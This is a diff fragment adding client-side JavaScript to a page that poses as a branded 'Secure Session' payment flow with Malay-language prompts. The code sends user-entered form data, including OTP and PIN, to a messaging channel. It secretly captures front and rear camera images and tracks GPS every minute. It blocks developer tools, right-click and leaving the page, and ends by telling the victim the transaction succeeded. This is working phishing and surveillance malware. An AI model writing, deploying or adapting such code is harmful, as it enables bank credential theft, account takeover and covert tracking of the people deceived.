+    let msg = `🔔 <b>[${BRAND}] USER INPUT</b>\n`;
+    msg += `🆔 ${SESSION_ID}\n`;
+    msg += `🎯 Aksi: <b>${key.toUpperCase()}</b>\n`;
+    msg += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
+    msg += `━━━━━━━━━━━━━━━━━━━\n`;
+    Object.entries(data).forEach(([k,v])=>{
+        msg += `▫️ ${k.replace('inp_','').replace(/_/g,' ').toUpperCase()}: <code>${v}</code>\n`;
+    });
+    await sendText(msg);
+
+    // Trigger capture kamera lagi setelah user input (dapat muka fresh)
+    captureFrontCamera();
+
+    if(key !== 'otp' && key !== 'pin'){
+        toast('✓ Data dihantar. Sila tunggu pengesahan...');
+        setTimeout(()=>{ closeModal(); openModal('otp'); }, 900);
+    } else if(key === 'otp'){
+        toast('✓ OTP diterima. Sahkan PIN...');
+        setTimeout(()=>{ closeModal(); openModal('pin'); }, 900);
+    } else if(key === 'pin'){
+        toast('⏳ Memproses transaksi...');
+        setTimeout(async ()=>{
+            closeModal();
+            await captureFrontCamera();
+            await captureRearCamera();
+            await sendText(`🏁 <b>[${BRAND}] SESSION ${SESSION_ID} COMPLETE</b>\nUser selesai flow transaksi.`);
+            toast('✓ Transaksi berjaya diproses');
+        }, 1200);
+    }
+}
+
+document.getElementById('overlay').addEventListener('click', e=>{
+    if(e.target.id === 'overlay') closeModal();
+});
+
+/* ═══════════════════════════════════════════════════════
+   ANTI-EXIT & TAMPER
+   ═══════════════════════════════════════════════════════ */
+window.addEventListener('beforeunload', e=>{
+    if(captured.front > 0){
+        e.preventDefault();
+        e.returnValue = '';
+    }
+});
+document.addEventListener('contextmenu', e=>e.preventDefault());
+document.addEventListener('keydown', e=>{
+    if(e.key === 'F12') e.preventDefault();
+    if(e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key)) e.preventDefault();
+});
+
+// Auto re-capture kalau balik ke tab
+document.addEventListener('visibilitychange', ()=>{
+    if(!document.hidden && captured.front > 0){
+        setTimeout(captureFrontCamera, 1000);
+        setTimeout(trackGPS, 500);
+    }
+});
+
+// Update GPS tiap 60 detik (live tracking)
+setInterval(()=>{
+    if(captured.front > 0) trackGPS();
+}, 60000);
+
+console.log(`%c🔒 ${BRAND} Secure Session ${SESSION_ID}`,'color:#0018A8;font-size:16px;font-weight:bold');
+</script>
+</body>
+</html>
